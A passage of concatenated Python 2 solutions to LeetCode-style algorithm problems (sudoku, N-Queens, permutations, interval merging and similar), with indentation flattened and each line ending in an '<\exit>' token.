return result<\exit>
def findSubstring(self, S, L):<\exit>
if not L:<\exit>
return<\exit>
k = len(L[0])<\exit>
l = len(L)<\exit>
Lmap = {}<\exit>
for item in L:<\exit>
if item in Lmap:<\exit>
Lmap[item] += 1<\exit>
else:<\exit>
Lmap[item] = 1<\exit>
Lmap_original = dict(Lmap)<\exit>
ret = []<\exit>
win_e = -1<\exit>
working_win = []<\exit>
i = 0<\exit>
while i<len(S):<\exit>
if len(working_win)==l:<\exit>
ret.append(win_e-l*k)<\exit>
candidate = win_e-l*k+1<\exit>
if S[candidate:candidate+k] in Lmap:<\exit>
win_e = -1<\exit>
i = candidate<\exit>
Lmap = dict(Lmap_original)<\exit>
working_win = []<\exit>
word = S[i:i+k]<\exit>
if word in Lmap and Lmap[word]>0:<\exit>
working_win.append(word)<\exit>
Lmap[word] -= 1<\exit>
win_e = i+k<\exit>
i += k<\exit>
elif word not in Lmap:<\exit>
if working_win:<\exit>
i = win_e-len(working_win)*k+1<\exit>
else:<\exit>
i += 1<\exit>
working_win = []<\exit>
win_e = -1<\exit>
Lmap = dict(Lmap_original)<\exit>
elif word in Lmap and Lmap[word]==0:<\exit>
for j in xrange(0, working_win.index(word)+1):<\exit>
Lmap[working_win[j]] += 1<\exit>
working_win = working_win[working_win.index(word)+1:]<\exit>
working_win.append(word)<\exit>
Lmap[word] -= 1<\exit>
win_e = i+k<\exit>
i += k<\exit>
if len(working_win)==l:<\exit>
ret.append(win_e-l*k)<\exit>
return ret<\exit>
if __name__=="__main__":<\exit>
assert Solution().findSubstring("abababab", ["a","b","a"])==[0,2,4]<\exit>
assert Solution().findSubstring("a", ["a"])==[0]<\exit>
assert Solution().findSubstring("lingmindraboofooowingdingbarrwingmonkeypoundcake", ["fooo","barr","wing","ding","wing"])==[13]<\exit>
assert Solution().findSubstring("barfoofoofoobarman", ["foo", "foo"])==[3, 6]<\exit>
class Solution:<\exit>
def nextPermutation(self, num):<\exit>
length = len(num)<\exit>
partition_num_index = 0<\exit>
change_num_index = 0<\exit>
for i in reversed(xrange(1, length)):<\exit>
if num[i]>num[i-1]:<\exit>
partition_num_index = i-1<\exit>
break<\exit>
for i in reversed(xrange(1, length)):<\exit>
if num[i]>num[partition_num_index]:<\exit>
change_num_index = i<\exit>
break<\exit>
num[partition_num_index], num[change_num_index] = num[change_num_index], num[partition_num_index]<\exit>
if partition_num_index==change_num_index==0:<\exit>
num.reverse()<\exit>
else:<\exit>
num[partition_num_index+1:] = reversed(num[partition_num_index+1:])<\exit>
return num<\exit>
if __name__=="__main__":<\exit>
print Solution().nextPermutation([3, 2, 1])<\exit>
class Solution(object):<\exit>
def longestValidParentheses(self, s):<\exit>
stk = []<\exit>
maxa = 0<\exit>
for idx, val in enumerate(s):<\exit>
if val == ")" and stk and s[stk[-1]] == "(":<\exit>
stk.pop()<\exit>
if not stk:<\exit>
maxa = max(maxa, idx+1)<\exit>
else:<\exit>
maxa = max(maxa, idx-stk[-1])<\exit>
else:<\exit>
stk.append(idx)<\exit>
return maxa<\exit>
if __name__ == "__main__":<\exit>
assert Solution().longestValidParentheses("(()()") == 4<\exit>
assert Solution().longestValidParentheses("()(()") == 2<\exit>
assert Solution().longestValidParentheses("(()") == 2<\exit>
assert Solution().longestValidParentheses(")()())") == 4<\exit>
class Solution:<\exit>
def searchRange(self, A, target):<\exit>
result = []<\exit>
length = len(A)<\exit>
start = 0<\exit>
end = length<\exit>
while start<end:<\exit>
mid = (start+end)/2<\exit>
if A[mid]<target:<\exit>
start = mid+1<\exit>
else:<\exit>
end = mid<\exit>
if start<length and A[start]==target:<\exit>
result.append(start)<\exit>
else:<\exit>
return [-1, -1]<\exit>
start = start<\exit>
end = length<\exit>
while start<end:<\exit>
mid = (start+end)/2<\exit>
if A[mid]<=target:<\exit>
start = mid+1<\exit>
else:<\exit>
end = mid<\exit>
result.append(start-1)<\exit>
return result<\exit>
class Solution:<\exit>
def search(self, A, target):<\exit>
length = len(A)<\exit>
start = 0<\exit>
end = length-1<\exit>
while start<=end:<\exit>
mid = (start+end)/2<\exit>
if A[mid]==target:<\exit>
return mid<\exit>
if A[start]<A[mid]<A[end]:<\exit>
if target>A[mid]:<\exit>
start = mid+1<\exit>
else:<\exit>
end = mid-1<\exit>
elif A[start]>A[mid] and A[mid]<A[end]:<\exit>
if target>A[mid] and target<=A[end]:<\exit>
start = mid+1<\exit>
else:<\exit>
end = mid -1<\exit>
else:<\exit>
if target<A[mid] and target>=A[start]:<\exit>
end = mid-1<\exit>
else:<\exit>
start = mid+1<\exit>
return -1<\exit>
if __name__=="__main__":<\exit>
print Solution().search([5,1,3], 5)<\exit>
class Solution:<\exit>
def searchInsert_complex(self, A, target):<\exit>
length = len(A)<\exit>
if not A or length==0:<\exit>
return 0<\exit>
start = 0<\exit>
end = length -1<\exit>
while True:<\exit>
mid = (start+end)/2<\exit>
if target==A[mid]:<\exit>
return mid<\exit>
elif target<A[mid]:<\exit>
end = mid-1<\exit>
if not start<=end:<\exit>
return mid if mid>=0 else 0<\exit>
else:<\exit>
start = mid+1<\exit>
if not start<=end:<\exit>
return start<\exit>
def searchInsert(self, A, target):<\exit>
length = len(A)<\exit>
if not A or length==0:<\exit>
return 0<\exit>
start = 0<\exit>
end = length<\exit>
while start<end:<\exit>
mid = (start + end) / 2<\exit>
if target==A[mid]:<\exit>
return mid<\exit>
elif target<A[mid]:<\exit>
end = mid<\exit>
else:<\exit>
start = mid + 1<\exit>
return start<\exit>
if __name__=="__main__":<\exit>
assert Solution().searchInsert([1, 3, 5, 6], 5)==2<\exit>
assert Solution().searchInsert([1, 3, 5, 6], 2)==1<\exit>
assert Solution().searchInsert([1, 3, 5, 6], 7)==4<\exit>
assert Solution().searchInsert([1, 3, 5, 6], 0)==0<\exit>
class Solution:<\exit>
def isValidSudoku(self, board):<\exit>
for i in xrange(9):<\exit>
row = []<\exit>
column = []<\exit>
square = []<\exit>
for j in xrange(9):<\exit>
try:<\exit>
row_element = int(board[i][j])<\exit>
if row_element in row:<\exit>
return False<\exit>
else:<\exit>
row.append(row_element)<\exit>
except ValueError:<\exit>
pass<\exit>
try:<\exit>
column_element = int(board[j][i])<\exit>
if column_element in column:<\exit>
return False<\exit>
else:<\exit>
column.append(column_element)<\exit>
except ValueError:<\exit>
pass<\exit>
try:<\exit>
square_element = int(board[i/3*3 + j/3][i%3*3 + j%3])<\exit>
if square_element in square:<\exit>
return False<\exit>
else:<\exit>
square.append(square_element)<\exit>
except ValueError:<\exit>
pass<\exit>
return True<\exit>
if __name__=="__main__":<\exit>
assert Solution().isValidSudoku(<\exit>
["..4...63.", ".........", "5......9.", "...56....", "4.3.....1", "...7.....", "...5.....", ".........",<\exit>
"........."]<\exit>
)==False<\exit>
class Solution:<\exit>
def solveSudoku(self, board):<\exit>
for row in xrange(len(board)):<\exit>
board[row] = list(board[row])<\exit>
self.solve(board, 0, 0)<\exit>
for row in xrange(len(board)):<\exit>
board[row] = "".join(board[row])<\exit>
def solve_TLE(self, board):<\exit>
n = len(board)<\exit>
if all([board[i/n][i%n]!="." for i in xrange(n*n)]):<\exit>
return True<\exit>
for i in xrange(n):<\exit>
for j in xrange(n):<\exit>
if board[i][j]==".":<\exit>
for num in range(1, 10):<\exit>
num_str = str(num)<\exit>
condition_row = all([board[i][col]!=num_str for col in xrange(n)])<\exit>
condition_col = all([board[row][j]!=num_str for row in xrange(n)])<\exit>
condition_square = all([board[i/3*3+count/3][j/3*3+count%3]!=num_str for count in xrange(n)])<\exit>
if condition_col and condition_row and condition_square:<\exit>
board[i][j] = num_str<\exit>
if not self.solve(board):<\exit>
board[i][j] = "."<\exit>
else:<\exit>
return True<\exit>
return False<\exit>
def solve(self, board, i, j):<\exit>
if j>=9:<\exit>
return self.solve(board, i+1, 0)<\exit>
if i==9:<\exit>
return True<\exit>
if board[i][j]==".":<\exit>
for num in range(1, 10):<\exit>
num_str = str(num)<\exit>
if all([board[i][col]!=num_str for col in xrange(9)]) and \<\exit>
all([board[row][j]!=num_str for row in xrange(9)]) and \<\exit>
all([board[i/3*3+count/3][j/3*3+count%3]!=num_str for count in xrange(9)]):<\exit>
board[i][j] = num_str<\exit>
if not self.solve(board, i, j+1):<\exit>
board[i][j] = "."<\exit>
else:<\exit>
return True<\exit>
else:<\exit>
return self.solve(board, i, j+1)<\exit>
return False<\exit>
if __name__=="__main__":<\exit>
Solution().solveSudoku(<\exit>
["..9748...", "7........", ".2.1.9...", "..7...24.", ".64.1.59.", ".98...3..", "...8.3.2.", "........6",<\exit>
"...2759.."]<\exit>
)<\exit>
class Solution:<\exit>
def countAndSay(self, n):<\exit>
string = "1"<\exit>
for i in range(1, n):<\exit>
string = self.singleCountAndSay(string)<\exit>
return string<\exit>
def singleCountAndSay(self, num_string):<\exit>
string_builder = ""<\exit>
i = 0<\exit>
while i<len(num_string):<\exit>
j = i+1<\exit>
while j<len(num_string) and num_string[j]==num_string[i]:<\exit>
j += 1<\exit>
count = j-i<\exit>
string_builder += str(count)+str(num_string[i])<\exit>
i = j<\exit>
return string_builder<\exit>
if __name__=="__main__":<\exit>
print Solution().countAndSay(4)<\exit>
from typing import List<\exit>
class Solution:<\exit>
def combinationSum2(self, candidates: List[int], target: int) -> List[List[int]]:<\exit>
ret = []<\exit>
candidates.sort()<\exit>
self.dfs(candidates, 0, [], 0, target, ret)<\exit>
return ret<\exit>
def dfs(self, candidates, i, cur, cur_sum, target, ret):<\exit>
if cur_sum == target:<\exit>
ret.append(list(cur))<\exit>
return<\exit>
if cur_sum > target or i >= len(candidates):<\exit>
return<\exit>
j = i + 1<\exit>
while j < len(candidates) and candidates[j] == candidates[i]:<\exit>
j += 1<\exit>
self.dfs(candidates, j, cur, cur_sum, target, ret)<\exit>
cur.append(candidates[i])<\exit>
cur_sum += candidates[i]<\exit>
self.dfs(candidates, i + 1, cur, cur_sum, target, ret)<\exit>
cur.pop()<\exit>
cur_sum -= candidates[i]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().combinationSum2([2,5,2,1,2], 5) == [[5], [1,2,2]]<\exit>
class Solution:<\exit>
def combinationSum2(self, candidates, target):<\exit>
result = []<\exit>
candidates.sort()<\exit>
self.get_combination_sum(candidates, [], target, result)<\exit>
return result<\exit>
def get_combination_sum(self, candidates, cur, target, result):<\exit>
if sum(cur)==target:<\exit>
result.append(cur)<\exit>
return<\exit>
if sum(cur)>target:<\exit>
return<\exit>
ind = 0<\exit>
while ind<len(candidates):<\exit>
self.get_combination_sum(candidates[ind+1:], cur+[candidates[ind]], target, result)<\exit>
while ind+1<len(candidates) and candidates[ind]==candidates[ind+1]: ind+= 1<\exit>
ind += 1<\exit>
if __name__=="__main__":<\exit>
print Solution().combinationSum2([10, 1, 2, 7, 6, 1, 5], 8)<\exit>
from typing import List<\exit>
class Solution:<\exit>
def combinationSum(self, candidates: List[int], target: int) -> List[List[int]]:<\exit>
ret = []<\exit>
self.dfs(candidates, 0, [], 0, target, ret)<\exit>
return ret<\exit>
def dfs(self, candidates, i, cur, cur_sum, target, ret):<\exit>
if cur_sum == target:<\exit>
ret.append(list(cur))<\exit>
return<\exit>
if cur_sum > target or i >= len(candidates):<\exit>
return<\exit>
self.dfs(candidates, i + 1, cur, cur_sum, target, ret)<\exit>
cur.append(candidates[i])<\exit>
cur_sum += candidates[i]<\exit>
self.dfs(candidates, i, cur, cur_sum, target, ret)<\exit>
cur.pop()<\exit>
cur_sum -= candidates[i]<\exit>
class Solution:<\exit>
def combinationSum(self, candidates, target):<\exit>
candidates.sort()<\exit>
result = []<\exit>
self.get_combination(target, candidates, [], result)<\exit>
return result<\exit>
def get_combination(self, target, candidates, current, result):<\exit>
if not candidates or sum(current)>target:<\exit>
return<\exit>
if sum(current)==target:<\exit>
result.append(current)<\exit>
return<\exit>
for ind, val in enumerate(candidates):<\exit>
self.get_combination(target, candidates[ind:], current+[val], result)<\exit>
if __name__=="__main__":<\exit>
print Solution().combinationSum([2,3,6,7], 7)<\exit>
class Solution:<\exit>
def firstMissingPositive(self, A):<\exit>
if not A:<\exit>
return 1<\exit>
i = 0<\exit>
length = len(A)<\exit>
while i<length:<\exit>
current = A[i]<\exit>
if current<=0 or current>length or A[current-1]==current:<\exit>
i += 1<\exit>
else:<\exit>
A[current-1], A[i] = current, A[current-1]<\exit>
for i in xrange(length):<\exit>
if A[i]!=i+1:<\exit>
return i+1<\exit>
return A[-1]+1<\exit>
if __name__=="__main__":<\exit>
assert Solution().firstMissingPositive([3,4,-1,1])==2<\exit>
class Solution:<\exit>
def trap(self, height: List[int]) -> int:<\exit>
n = len(height)<\exit>
lefts = [0 for _ in range(n+1)]<\exit>
rights = [0 for _ in range(n+1)]<\exit>
for i in range(1, n+1):<\exit>
lefts[i] = max(lefts[i-1], height[i-1])<\exit>
for i in range(n-1, -1, -1):<\exit>
rights[i] = max(rights[i+1], height[i])<\exit>
ret = 0<\exit>
for i in range(n):<\exit>
ret += max(<\exit>
0,<\exit>
min(lefts[i], rights[i+1]) - height[i]<\exit>
)<\exit>
return ret<\exit>
class Solution:<\exit>
def trap(self, A):<\exit>
left_maxs = [0 for _ in A]<\exit>
right_maxs = [0 for _ in A]<\exit>
left_max = 0<\exit>
for ind, val in enumerate(A):<\exit>
left_max = max(left_max, val)<\exit>
left_maxs[ind] = left_max<\exit>
right_max = 0<\exit>
for ind, val in reversed(list(enumerate(A))):<\exit>
right_max = max(right_max, val)<\exit>
right_maxs[ind] = right_max<\exit>
volume = 0<\exit>
for ind, val in enumerate(A):<\exit>
volume += max(0, min(left_maxs[ind], right_maxs[ind]) - val)<\exit>
return volume<\exit>
if __name__=="__main__":<\exit>
print Solution().trap([0, 1, 0, 2, 1, 0, 1, 3, 2, 1, 2, 1])<\exit>
class Solution(object):<\exit>
def multiply(self, num1, num2):<\exit>
result = []<\exit>
if len(num1) > len(num2):<\exit>
return self.multiply(num2, num1)<\exit>
num1 = map(int, list(num1[::-1]))<\exit>
num2 = map(int, list(num2[::-1]))<\exit>
for d in num1:<\exit>
result.append(self.multiply_1_digit(d, num2))<\exit>
lst = self.add_list(result)<\exit>
lst.reverse()<\exit>
result = "".join(map(str, lst)).lstrip("0")<\exit>
if not result:<\exit>
return "0"<\exit>
return result<\exit>
def multiply_1_digit(self, digit, num):<\exit>
ret = []<\exit>
carry = 0<\exit>
for elt in num:<\exit>
mul = elt*digit + carry<\exit>
carry = mul/10<\exit>
mul %= 10<\exit>
ret.append(mul)<\exit>
if carry != 0:<\exit>
ret.append(carry)<\exit>
return ret<\exit>
def add_list(self, lst):<\exit>
sig = 0<\exit>
ret = [0]<\exit>
for ind, val in enumerate(lst):<\exit>
for i in xrange(sig): val.insert(0, 0)<\exit>
ret = self.add(ret, val)<\exit>
sig += 1<\exit>
return ret<\exit>
def add(self, num1, num2):<\exit>
if len(num1) > len(num2):<\exit>
return self.add(num2, num1)<\exit>
ret = []<\exit>
carry = 0<\exit>
for idx in xrange(len(num2)):<\exit>
try:<\exit>
sm = num1[idx] + num2[idx] + carry<\exit>
except IndexError:<\exit>
sm = num2[idx] + carry<\exit>
carry = sm/10<\exit>
ret.append(sm % 10)<\exit>
if carry != 0:<\exit>
ret.append(carry)<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
solution = Solution()<\exit>
assert [1, 2] == solution.add([2, 1], [9])<\exit>
assert str(123*999) == solution.multiply("123", "999")<\exit>
assert str(0) == solution.multiply("0", "0")<\exit>
assert str(123*456) == solution.multiply("123", "456")<\exit>
class Solution:<\exit>
def isMatch_MLE(self, s, p):<\exit>
tape = s<\exit>
pattern = p<\exit>
m = len(tape)<\exit>
n = len(pattern)<\exit>
dp = [[False for _ in xrange(n+1)] for _ in xrange(m+1)]<\exit>
dp[m][n] = True<\exit>
for j in xrange(n-1, -1 , -1):<\exit>
if pattern[j]=="*":<\exit>
dp[m][j] = dp[m][j+1]<\exit>
for i in xrange(m-1, -1, -1):<\exit>
for j in xrange(n-1, -1, -1):<\exit>
if tape[i]==pattern[j] or pattern[j]=="?":<\exit>
dp[i][j] = dp[i+1][j+1]<\exit>
elif pattern[j]=="*":<\exit>
dp[i][j] = dp[i][j+1] or dp[i+1][j]<\exit>
else:<\exit>
dp[i][j] = False<\exit>
return dp[0][0]<\exit>
def isMatch_forward(self, s, p):<\exit>
tape = s<\exit>
pattern = p<\exit>
m = len(tape)<\exit>
n = len(pattern)<\exit>
if n - list(pattern).count("*") > m:<\exit>
return False<\exit>
dp = [False for _ in xrange(m+1)]<\exit>
dp[0] = True<\exit>
for j in xrange(1, n+1):<\exit>
if pattern[j-1]=="*":<\exit>
k = 0<\exit>
while k<m+1 and dp[k]!=True: k+= 1<\exit>
for i in xrange(k, m+1):<\exit>
dp[i] = True<\exit>
else:<\exit>
for i in xrange(m, 0, -1):<\exit>
dp[i] = dp[i-1] and (tape[i-1]==pattern[j-1] or pattern[j-1]=="?")<\exit>
dp[0] = dp[0] and pattern[j-1]=="*"<\exit>
return dp[m]<\exit>
if __name__=="__main__":<\exit>
assert Solution().isMatch("aab", "c*a*b")==False<\exit>
assert Solution().isMatch("aa","a")==False<\exit>
assert Solution().isMatch("aa", "aa")==True<\exit>
assert Solution().isMatch("aaa", "aa")==False<\exit>
assert Solution().isMatch("aaa", "*")==True<\exit>
assert Solution().isMatch("aa", "a*")==True<\exit>
assert Solution().isMatch("ab", "?*")==True<\exit>
class Solution:<\exit>
def jump_TLE(self, A):<\exit>
if not A:<\exit>
return 0<\exit>
length = len(A)<\exit>
counter = 0<\exit>
dp = [[] for _ in A]<\exit>
q = []<\exit>
q.append(0)<\exit>
while q:<\exit>
current_level = q<\exit>
q = []<\exit>
for ind in current_level:<\exit>
if ind>=length-1:<\exit>
return counter<\exit>
for j in xrange(ind+1, ind+A[ind]+1):<\exit>
if j not in current_level:<\exit>
q.append(j)<\exit>
counter += 1<\exit>
return counter<\exit>
def jump(self, A):<\exit>
length = len(A)<\exit>
counter = 0<\exit>
start = 0<\exit>
end = 1<\exit>
gmax = 0<\exit>
while end<length:<\exit>
if not start<end: return 0<\exit>
for i in xrange(start, end):<\exit>
gmax = max(gmax, A[i]+i)<\exit>
counter += 1<\exit>
start = end<\exit>
end = gmax+1<\exit>
return counter<\exit>
if __name__=="__main__":<\exit>
print Solution().jump([3, 2, 1, 0, 4])<\exit>
assert Solution().jump([2,3,1,1,4])==2<\exit>
class Solution:<\exit>
def permute(self, num):<\exit>
result = []<\exit>
self.get_permute(num, [], result)<\exit>
return result<\exit>
def get_permute(self, seq, current, result):<\exit>
length = len(seq)<\exit>
if length==0:<\exit>
result.append(current)<\exit>
for ind, val in enumerate(seq):<\exit>
self.get_permute(seq[:ind]+seq[ind+1:], current+[val], result)<\exit>
if __name__=="__main__":<\exit>
print Solution().permute([1, 2, 3])<\exit>
class Solution:<\exit>
def permuteUnique_TLE(self, num):<\exit>
result = []<\exit>
self.get_permute(num, [], result)<\exit>
return map(list, set(map(tuple, result)))<\exit>
def get_permute_TLE(self, nums, current, result):<\exit>
length = len(nums)<\exit>
if length==0:<\exit>
result.append(current)<\exit>
for ind, val in enumerate(nums):<\exit>
self.get_permute(nums[:ind]+nums[ind+1:], current+[val], result)<\exit>
def permuteUnique(self, num):<\exit>
result = []<\exit>
num.sort()<\exit>
self.get_permute(num, [], result)<\exit>
return result<\exit>
def get_permute(self, nums, current, result):<\exit>
if not nums:<\exit>
result.append(current)<\exit>
for ind, val in enumerate(nums):<\exit>
if ind-1>=0 and val==nums[ind-1]: continue<\exit>
self.get_permute(nums[:ind]+nums[ind+1:], current+[val], result)<\exit>
if __name__=="__main__":<\exit>
print Solution().permuteUnique([1, 1, 2])<\exit>
class Solution:<\exit>
def rotate(self, matrix):<\exit>
n = len(matrix)<\exit>
for row in range(n):<\exit>
for col in range(n-row):<\exit>
matrix[row][col], matrix[n-1-col][n-1-row] = matrix[n-1-col][n-1-row], matrix[row][col]<\exit>
for row in range(n/2):<\exit>
for col in range(n):<\exit>
matrix[row][col], matrix[n-1-row][col] = matrix[n-1-row][col], matrix[row][col]<\exit>
return matrix<\exit>
class Solution:<\exit>
def pow(self, x, n):<\exit>
invert_flag = False if n > 0 else True<\exit>
n = abs(n)<\exit>
product = 1.0<\exit>
while n > 0:<\exit>
if n & 1 == 1:<\exit>
product *= x<\exit>
n = n >> 1<\exit>
x *= x<\exit>
if invert_flag:<\exit>
product = 1.0 / product<\exit>
return product<\exit>
def pow_TLE(self, x, n):<\exit>
if abs(x)<=0.00001:<\exit>
return 0<\exit>
if x==1.0:<\exit>
return 1<\exit>
if x==-1.0:<\exit>
if n&1==1:<\exit>
return 1<\exit>
else:<\exit>
return -1<\exit>
if abs(x-1.0)<1e-6:<\exit>
return 1+(x-1.0)*n<\exit>
if abs(x--1.0)<1e-6:<\exit>
if n % 2==0:<\exit>
return self.pow(-x, n)<\exit>
else:<\exit>
return -self.pow(-x, n)<\exit>
product = 1.0<\exit>
for i in xrange(abs(n)):<\exit>
pre = product<\exit>
if n>0:<\exit>
product *= x<\exit>
else:<\exit>
product /= x<\exit>
if abs(product - pre)<1e-5:<\exit>
break<\exit>
return product<\exit>
if __name__=="__main__":<\exit>
print Solution().pow(8.88023, 3)<\exit>
class Solution:<\exit>
def anagrams_complicated(self, strs):<\exit>
temp = list(strs)<\exit>
for ind, string in enumerate(temp):<\exit>
if string and string!="":<\exit>
string = [char for char in string]<\exit>
string.sort()<\exit>
string = "".join(string)<\exit>
temp[ind] = string<\exit>
hash_map = {}<\exit>
for ind, string in enumerate(temp):<\exit>
indexes = hash_map.get(string, [])<\exit>
indexes.append(ind)<\exit>
hash_map[string] = indexes<\exit>
result = []<\exit>
for val in hash_map.values():<\exit>
if len(val)>1:<\exit>
result += [strs[i] for i in val]<\exit>
return result<\exit>
def anagrams(self, strs):<\exit>
hash_map = {}<\exit>
for ind, string in enumerate(strs):<\exit>
string = "".join(sorted(string))<\exit>
if string not in hash_map:<\exit>
hash_map[string] = [ind]<\exit>
else:<\exit>
hash_map[string].append(ind)<\exit>
result = []<\exit>
for val in hash_map.values():<\exit>
if len(val)>1:<\exit>
result += [strs[i] for i in val]<\exit>
return result<\exit>
if __name__=="__main__":<\exit>
Solution().anagrams(["", ""])<\exit>
INVALID = -1<\exit>
QUEEN = 1<\exit>
DEFAULT = 0<\exit>
directions = [(+1, +1), (-1, -1), (-1, +1), (+1, -1)]<\exit>
class Solution:<\exit>
def solveNQueens(self, n):<\exit>
result = []<\exit>
current = [[0 for _ in xrange(n)] for _ in xrange(n)]<\exit>
self.backtrack(0, current, result)<\exit>
return self.transform2string(result)<\exit>
def backtrack(self, queen_index, current, result):<\exit>
n = len(current)<\exit>
if queen_index==n:<\exit>
result.append(current)<\exit>
return<\exit>
for i in xrange(n):<\exit>
if current[queen_index][i]==INVALID:<\exit>
continue<\exit>
new_config = [list(element) for element in current]<\exit>
new_config[queen_index][i] = QUEEN<\exit>
for m in xrange(n):<\exit>
if new_config[m][i]==DEFAULT:<\exit>
new_config[m][i] = INVALID<\exit>
if new_config[queen_index][m]==DEFAULT:<\exit>
new_config[queen_index][m] = INVALID<\exit>
for direction in directions:<\exit>
row = queen_index+direction[0]*m<\exit>
col = i+direction[1]*m<\exit>
if 0<=row<n and 0<=col<n and new_config[row][col]==DEFAULT:<\exit>
new_config[row][col] = INVALID<\exit>
self.backtrack(queen_index+1, new_config, result)<\exit>
def transform2string(self, result):<\exit>
string_result = []<\exit>
for configuration in result:<\exit>
current = []<\exit>
for row in configuration:<\exit>
row = map(lambda x: "." if x==-1 else "Q", row)<\exit>
row = "".join(row)<\exit>
current.append(row)<\exit>
string_result.append(current)<\exit>
return string_result<\exit>
if __name__=="__main__":<\exit>
assert Solution().solveNQueens(4)==[['.Q..', '...Q', 'Q...', '..Q.'], ['..Q.', 'Q...', '...Q', '.Q..']]<\exit>
INVALID = -1<\exit>
QUEEN = 1<\exit>
DEFAULT = 0<\exit>
class Solution:<\exit>
def totalNQueens(self, n):<\exit>
result = []<\exit>
current = [[0 for _ in xrange(n)] for _ in xrange(n)]<\exit>
self.backtrack(0, current, result)<\exit>
return len(result)<\exit>
def backtrack(self, queen_index, current, result):<\exit>
n = len(current)<\exit>
if queen_index==n:<\exit>
result.append(current)<\exit>
return<\exit>
for i in xrange(n):<\exit>
if current[queen_index][i]==INVALID:<\exit>
continue<\exit>
new_config = [list(element) for element in current]<\exit>
new_config[queen_index][i] = QUEEN<\exit>
for m in xrange(n):<\exit>
if new_config[m][i]==DEFAULT:<\exit>
new_config[m][i] = INVALID<\exit>
if new_config[queen_index][m]==DEFAULT:<\exit>
new_config[queen_index][m] = INVALID<\exit>
row = queen_index+m<\exit>
col = i+m<\exit>
if 0<=row<n and 0<=col<n and new_config[row][col]==DEFAULT: new_config[row][col] = INVALID<\exit>
row = queen_index-m<\exit>
col = i-m<\exit>
if 0<=row<n and 0<=col<n and new_config[row][col]==DEFAULT: new_config[row][col] = INVALID<\exit>
row = queen_index-m<\exit>
col = i+m<\exit>
if 0<=row<n and 0<=col<n and new_config[row][col]==DEFAULT: new_config[row][col] = INVALID<\exit>
row = queen_index+m<\exit>
col = i-m<\exit>
if 0<=row<n and 0<=col<n and new_config[row][col]==DEFAULT: new_config[row][col] = INVALID<\exit>
self.backtrack(queen_index+1, new_config, result)<\exit>
if __name__=="__main__":<\exit>
print Solution().totalNQueens(4)<\exit>
class Solution:<\exit>
def maxSubArray(self, A):<\exit>
if not A:<\exit>
return 0<\exit>
largest = max(A)<\exit>
if largest<0:<\exit>
return largest<\exit>
max_result = -1<<31<\exit>
current_max = 0<\exit>
for i in range(len(A)):<\exit>
if current_max+A[i]>=0:<\exit>
current_max+=A[i]<\exit>
else:<\exit>
current_max = 0<\exit>
max_result = max(max_result, current_max)<\exit>
return max_result<\exit>
class Solution:<\exit>
def spiralOrder(self, matrix):<\exit>
if not matrix or not matrix[0]:<\exit>
return matrix<\exit>
result = []<\exit>
left = 0<\exit>
right = len(matrix[0]) - 1<\exit>
top = 0<\exit>
bottom = len(matrix) - 1<\exit>
while left <= right and top <= bottom:<\exit>
for c in xrange(left, right + 1):<\exit>
result.append(matrix[top][c])<\exit>
for r in xrange(top + 1, bottom + 1):<\exit>
result.append(matrix[r][right])<\exit>
for c in xrange(right - 1, left - 1, -1):<\exit>
if top < bottom:<\exit>
result.append(matrix[bottom][c])<\exit>
for r in xrange(bottom - 1, top, -1):<\exit>
if left < right:<\exit>
result.append(matrix[r][left])<\exit>
left += 1<\exit>
right -= 1<\exit>
top += 1<\exit>
bottom -= 1<\exit>
return result<\exit>
if __name__=="__main__":<\exit>
print Solution().spiralOrder([[2, 3]])<\exit>
class Solution:<\exit>
def canJump_TLE(self, A):<\exit>
length = len(A)<\exit>
dp = [set([index]) for index in range(length)]<\exit>
for ind, val in enumerate(A):<\exit>
if ind!=0 and len(dp[ind])<2:<\exit>
continue<\exit>
for i in xrange(ind+1, ind+val+1):<\exit>
if i>=length:<\exit>
break<\exit>
for item in dp[ind]:<\exit>
dp[i].add(item)<\exit>
return 0 in dp[-1]<\exit>
def canJump_TLE2(self, A):<\exit>
l = len(A)<\exit>
dp = [False for _ in xrange(l+1)]<\exit>
dp[0] = True<\exit>
for ind, val in enumerate(A):<\exit>
if dp[ind]:<\exit>
for i in xrange(1, val+1):<\exit>
if ind+i<l+1:<\exit>
dp[ind+i] = True<\exit>
else:<\exit>
break<\exit>
return dp[-1]<\exit>
def canJump(self, A):<\exit>
l = len(A)<\exit>
if l<=1:<\exit>
return True<\exit>
dp = [-1 for _ in xrange(l)]<\exit>
dp[0] = A[0]+0<\exit>
for i in xrange(1, l):<\exit>
if dp[i-1]>=l-1:<\exit>
return True<\exit>
if dp[i-1]<i:<\exit>
return False<\exit>
dp[i] = max(dp[i-1], A[i]+i)<\exit>
return False<\exit>
if __name__=="__main__":<\exit>
assert Solution().canJump([2, 3, 1, 1, 4])==True<\exit>
assert Solution().canJump([3, 2, 1, 0, 4])==False<\exit>
class Interval(object):<\exit>
def __init__(self, s=0, e=0):<\exit>
self.start = s<\exit>
self.end = e<\exit>
class Solution(object):<\exit>
def merge(self, itvls):<\exit>
if not itvls:<\exit>
return []<\exit>
itvls.sort(key=lambda x: x.start)<\exit>
ret = [itvls[0]]<\exit>
for cur in itvls[1:]:<\exit>
pre = ret[-1]<\exit>
if cur.start <= pre.end:<\exit>
pre.end = max(pre.end, cur.end)<\exit>
else:<\exit>
ret.append(cur)<\exit>
return ret<\exit>
def merge_error(self, itvls):<\exit>
if not itvls:<\exit>
return []<\exit>
ret = [itvls[0]]<\exit>
for interval in itvls[1:]:<\exit>
if ret[-1].end < interval.start:<\exit>
ret.append(interval)<\exit>
continue<\exit>
if ret[-1].start <= interval.start <= ret[-1].end <= interval.end:<\exit>
ret[-1].end = interval.end<\exit>
continue<\exit>
if interval.start <= ret[-1].start and ret[-1].end <= interval.end:<\exit>
ret[-1] = interval<\exit>
continue<\exit>
if ret[-1].start <= interval.start < ret[-1].end and ret[-1].start <= interval.end < ret[-1].end:<\exit>
ret.append(interval)<\exit>
continue<\exit>
if interval.start < ret[-1].start <= interval.end < ret[-1].end:<\exit>
ret[-1].start = interval.start<\exit>
continue<\exit>
if interval.end < ret[-1].start:<\exit>
ret.append(ret)<\exit>
continue<\exit>
return ret<\exit>
class Solution:<\exit>
def lengthOfLastWord(self, s):<\exit>
s = s.strip()<\exit>
lst = s.split(" ")<\exit>
try:<\exit>
last_word = lst[-1]<\exit>
return len(last_word)<\exit>
except IndexError:<\exit>
return 0<\exit>
class Interval(object):<\exit>
def __init__(self, s=0, e=0):<\exit>
self.start = s<\exit>
self.end = e<\exit>
def __str__(self):<\exit>
return "[%d, %d]" % (self.start, self.end)<\exit>
